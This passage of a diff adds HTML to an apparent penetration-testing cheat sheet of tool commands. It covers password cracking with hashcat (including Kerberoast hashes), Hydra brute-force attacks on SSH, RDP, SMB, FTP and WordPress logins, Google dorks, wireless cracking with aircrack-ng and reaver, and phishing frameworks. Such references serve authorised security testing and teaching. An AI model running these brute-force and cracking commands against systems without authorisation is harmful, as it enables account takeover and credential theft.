+        <div class="tool-command">Example: <code>hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\hashsample.hash "d:\WORDLISTS\realuniq.lst" -r OneRuleToRuleThemAll.rule</code></div>
+
+        <!-- Cracking Kerberoasting Hashes (KRB5TGS) -->
+        <h3>Cracking Kerberoasting Hashes (KRB5TGS)</h3>
+        <p>Hashcat supports multiple versions of KRB5TGS hashes:</p>
+        <ul>
+            <li><code>13100</code> - Type 23 - $krb5tgs$23$</li>
+            <li><code>19600</code> - Type 17 - $krb5tgs$17$</li>
+            <li><code>19700</code> - Type 18 - $krb5tgs$18$</li>
+        </ul>
+        <div class="tool-command">Example: <code>hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\krb5tgs.hash d:\WORDLISTS\realhuman_phill.txt -r OneRuleToRuleThemAll.rule</code></div>
+
+        <!-- Cracking NTLMv2 Hashes from a Packet Capture -->
+        <h3>Cracking NTLMv2 Hashes from a Packet Capture</h3>
+        <p>Follow this <a href="https://research.801labs.org/cracking-an-ntlmv2-hash/" target="_blank">9-step guide</a> to format NTLMv2 hashes from packet captures.</p>
+
+        <!-- Unshadowing for Linux Hashes -->
+        <h3>Unshadowing for Linux Hashes</h3>
+        <div class="tool-command">Create unshadowed file: <code>unshadow passwd-file.txt shadow-file.txt > unshadowed.txt</code></div>
+
+        <!-- Cracking ZIP Passwords -->
+        <h3>Cracking ZIP Passwords</h3>
+        <div class="tool-command">Generate hash: <code>zip2john Zipfile.zip | cut -d ':' -f 2 > hashes.txt</code></div>
+        <div class="tool-command">Crack ZIP password: <code>hashcat -a 0 -m 13600 hashes.txt /usr/share/wordlists/rockyou.txt</code></div>
+
+        <!-- PRINCE Password Generation -->
+        <h3>PRINCE Password Generation</h3>
+        <p>PRINCE is a utility for generating probable passwords based on chained elements:</p>
+        <div class="tool-command">Example: <code>pp64.bin --pw-min=8 &lt; dict.txt | head -20</code></div>
+
+        <!-- Purple Rain Attack -->
+        <h3>Purple Rain Attack</h3>
+        <div class="tool-command">Example: <code>shuf dict.txt | pp64.bin --pw-min=8 | hashcat -a 0 -m #type -w 4 -O hashes.txt -g 300000</code></div>
+    </div>
+</div>
+
+<!-- Hydra Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('hydra')">Hydra - Password brute-forcing tool.</div>
+    <div class="tool-details" id="hydra">
+        <div class="tool-command">Basic Attack: <code>hydra -l [user] -P [passwordlist] [target] [protocol]</code></div>
+        <div class="tool-command">Specify Options: <code>hydra -l [user] -P [passwordlist] [target] [protocol] -s [port]</code></div>
+        <div class="tool-command">Hydra SNMP brute force: <code>hydra -P password-file.txt -v $ip snmp</code></div>
+        <div class="tool-command">Hydra FTP brute force with known user: <code>hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></div>
+        <div class="tool-command">Hydra SSH with user and password list: <code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></div>
+        <div class="tool-command">Hydra SSH with known password and username list: <code>hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh</code></div>
+        <div class="tool-command">Hydra SSH against a known user on port 22: <code>hydra $ip -s 22 ssh -l -P big_wordlist.txt</code></div>
+        <div class="tool-command">Hydra POP3 brute force: <code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></div>
+        <div class="tool-command">Hydra SMTP brute force: <code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V</code></div>
+        <div class="tool-command">Hydra HTTP GET dictionary attack: <code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></div>
+        <div class="tool-command">Hydra RDP brute force with rockyou: <code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></div>
+        <div class="tool-command">Hydra SMB brute force with rockyou: <code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb</code></div>
+        <div class="tool-command">Hydra brute force Wordpress admin login: <code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'</code></div>
+        <div class="tool-command">Hydra SMB brute force with a user and password list: <code>hydra -L usernames.txt -P passwords.txt $ip smb -V -f</code></div>
+        <div class="tool-command">Hydra LDAP brute force: <code>hydra -L users.txt -P passwords.txt $ip ldap2 -V -f</code></div>
+    </div>
+</div>
+
+<!-- Information Gathering Tools -->
+<h2>Information Gathering</h2>
+
+<!-- Whois Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('whois')">Whois - Domain information gathering tool.</div>
+    <div class="tool-details" id="whois">
+        <div class="tool-command">Basic Query: <code>whois [domain]</code></div>
+        <div class="tool-command">Specify Server: <code>whois -h [server] [domain]</code></div>
+        <div class="tool-command">Enumerate Information: <code>whois -h &lt;HOST&gt; -p &lt;PORT&gt; "domain.tld"</code></div>
+        <div class="tool-command">Alternative Enumeration: <code>echo "domain.tld" | nc -vn &lt;HOST&gt; &lt;PORT&gt;</code></div>
+        <div class="tool-command">Grab WHOIS Banner: <code>whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43</code></div>
+    </div>
+</div>
+
+<!-- nslookup Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('nslookup')">nslookup - DNS query tool for querying DNS servers.</div>
+    <div class="tool-details" id="nslookup">
+        <div class="tool-command">Basic Query: <code>nslookup [domain]</code></div>
+        <div class="tool-command">Specify DNS Server: <code>nslookup [domain] [dns_server]</code></div>
+        <div class="tool-command">Find A Record: <code>nslookup [domain]</code></div>
+        <div class="tool-command">Check NS Records: <code>nslookup -type=ns [domain]</code></div>
+        <div class="tool-command">Query SOA Record: <code>nslookup -type=soa [domain]</code></div>
+        <div class="tool-command">Find MX Records: <code>nslookup -query=mx [domain]</code></div>
+        <div class="tool-command">Find All DNS Records: <code>nslookup -type=any [domain]</code></div>
+        <div class="tool-command">Use Specific DNS Server: <code>nslookup [domain] [dns_server]</code></div>
+        <div class="tool-command">Reverse DNS Lookup: <code>nslookup [IP_address]</code></div>
+        <div class="tool-command">Change Port Number: <code>nslookup -port=[port] [domain]</code></div>
+        <div class="tool-command">Change Timeout Interval: <code>nslookup -timeout=[seconds] [domain]</code></div>
+        <div class="tool-command">Enable Debug Mode: <code>nslookup -debug [domain]</code></div>
+    </div>
+</div>
+
+<!-- Google Dorks Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('googledorks')">Google Dorks - Google search query strings to find vulnerable websites.</div>
+    <div class="tool-details" id="googledorks">
+        <div class="tool-command">Basic Dork: <code>site:[domain] [dork]</code></div>
+        <div class="tool-command">Example: <code>site:example.com inurl:admin</code></div>
+        
+        <!-- Search Filters -->
+        <div class="tool-command">Search Filters:</div>
+        <div class="tool-command">All in Text: <code>allintext:"keyword"</code></div>
+        <div class="tool-command">In Text: <code>intext:"keyword"</code></div>
+        <div class="tool-command">In URL: <code>inurl:"keyword"</code></div>
+        <div class="tool-command">All in URL: <code>allinurl:"keyword"</code></div>
+        <div class="tool-command">In Title: <code>intitle:"keyword"</code></div>
+        <div class="tool-command">All in Title: <code>allintitle:"keyword"</code></div>
+        <div class="tool-command">Site: <code>site:"www.google.com"</code></div>
+        <div class="tool-command">Filetype: <code>filetype:"pdf"</code></div>
+        <div class="tool-command">Link: <code>link:"keyword"</code></div>
+        <div class="tool-command">Numrange: <code>numrange:321-325</code></div>
+        <div class="tool-command">Before/After: <code>filetype:pdf & (before:2000-01-01 after:2001-01-01)</code></div>
+        <div class="tool-command">In Anchor: <code>inanchor:"keyword"</code></div>
+        <div class="tool-command">In Post Author: <code>allinpostauthor:"keyword"</code></div>
+        <div class="tool-command">Related: <code>related:www.google.com</code></div>
+        <div class="tool-command">Cache: <code>cache:www.google.com</code></div>
+        
+        <!-- Operators -->
+        <div class="tool-command">Operators:</div>
+        <div class="tool-command">Exact Phrase: <code>"Tinned Sandwiches"</code></div>
+        <div class="tool-command">OR Operator: <code>site:facebook.com | site:twitter.com</code></div>
+        <div class="tool-command">AND Operator: <code>site:facebook.com & site:twitter.com</code></div>
+        <div class="tool-command">Operators Combination: <code>(site:facebook.com | site:twitter.com) & intext:"login"</code></div>
+        <div class="tool-command">Include Results: <code>-site:facebook.com +site:facebook.*</code></div>
+        <div class="tool-command">Exclude Results: <code>site:facebook.* -site:facebook.com</code></div>
+        <div class="tool-command">Synonyms: <code>~set</code></div>
+        <div class="tool-command">Glob Pattern: <code>site:*.com</code></div>
+    </div>
+</div>
+
+<!-- Wireless Attacks Tools -->
+<h2>Wireless Attacks</h2>
+
+<!-- Aircrack-ng Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('aircrack-ng')">Aircrack-ng - Wireless network cracking tool.</div>
+    <div class="tool-details" id="aircrack-ng">
+        <div class="tool-command">Crack WPA/WPA2: <code>aircrack-ng [capture_file] -w [wordlist]</code></div>
+        <div class="tool-command">Monitor Mode: <code>airmon-ng start [interface]</code></div>
+    </div>
+</div>
+
+<!-- Reaver Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('reaver')">Reaver - Brute-forcing WPS PINs to recover WPA/WPA2 passphrases.</div>
+    <div class="tool-details" id="reaver">
+        <div class="tool-command">Start Reaver: <code>reaver -i [interface] -b [bssid] -vv</code></div>
+        <div class="tool-command">Specify Pin: <code>reaver -i [interface] -b [bssid] -p [pin]</code></div>
+    </div>
+</div>
+
+<!-- Kismet Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('kismet')">Kismet - Wireless network detector, sniffer, and IDS.</div>
+    <div class="tool-details" id="kismet">
+        <div class="tool-command">Start Kismet: <code>kismet</code></div>
+        <div class="tool-command">Specify Interface: <code>kismet -c [interface]</code></div>
+    </div>
+</div>
+
+<!-- Social Engineering Tools -->
+<h2>Social Engineering</h2>
+
+<!-- Setoolkit Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('setoolkit')">Setoolkit (Social Engineer Toolkit) - Social engineering attack framework.</div>
+    <div class="tool-details" id="setoolkit">
+        <div class="tool-command">Start SET: <code>setoolkit</code></div>
+        <div class="tool-command">Choose Attack: Follow prompts to choose and configure attacks.</div>
+    </div>
+</div>
+
+<!-- Evilginx2 Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('evilginx2')">Evilginx2 - Advanced man-in-the-middle attack framework.</div>
+    <div class="tool-details" id="evilginx2">
+        <div class="tool-command">Start Evilginx2: <code>evilginx2</code></div>
+        <div class="tool-command">Configure Phishing: Follow documentation to configure phishing attacks.</div>
+    </div>
+</div>
+
+<!-- Miscellaneous Tools -->
+<h2>Misc Tools</h2>
+
+<!-- Wireshark Tool Row -->
+<div class="tool-row">
+    <div class="tool-name" onclick="toggleDetails('wireshark')">Wireshark - Network protocol analyzer.</div>
+    <div class="tool-details" id="wireshark">
+        <div class="tool-command">Start Wireshark: <code>wireshark</code></div>
+        <div class="tool-command">Capture Traffic: <code>File > Open > [capture_file]</code></div>
+    </div>
+</div>
